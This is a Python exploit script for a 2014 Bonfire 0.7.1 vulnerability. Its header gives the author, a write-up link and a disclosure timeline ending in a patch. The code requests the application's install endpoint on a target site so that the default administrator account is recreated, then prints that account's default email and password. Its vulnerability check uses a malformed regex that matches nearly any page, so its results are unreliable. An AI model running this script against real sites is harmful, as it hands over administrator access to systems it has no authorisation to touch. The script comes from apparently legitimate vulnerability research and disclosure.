#!/usr/bin/env python
# coding: utf-8
#
# Bonefire v.0.7.1 Reinstall Admin Account Exploit
#
# Author : Mehmet INCE
# 
# Analysis write-up : http://www.mehmetince.net/ci-bonefire-reinstall-admin-account-vulnerability-analysis-exploit/
#
# Description : 
# Forgotten controls lead to call install module which lead to
# create default administrator account again!
#
# TIMELINE
# 21 Apr 2014 14:00 –Vulnerability found
# 23 Apr 2014 21:20 – Analysis and write-up completed
# 23 Apr 2014 21:29 – First contact with lead developer of Bonfire
# 23 Apr 2014 21:33 – Response from lead developer
# 23 Apr 2014 21:52 – Vulnerability confirmed by lead developer
# 23 Apr 2014 21:55 – Vulnerability has been patched via following commit
# https://github.com/ci-bonfire/Bonfire/commit/9cb76c66babf89952c3d48279b026c59e198f46e

import urllib2
import sys
import re
target = sys.argv[1]
path = sys.argv[2]

if len(sys.argv) > 3:
     print "Usage : python bonfire www.target.com /path/"
     exit(0) 

content = urllib2.urlopen(target+path+"index.php/install/do_install").read()

if re.search('[admin@mybonefire.com]', content):
     print "Target is vulnerable!"
     print "Username : admin@mybonefire.com"
     print "Password : password"
else:
     print "Target is not vulnerable..."










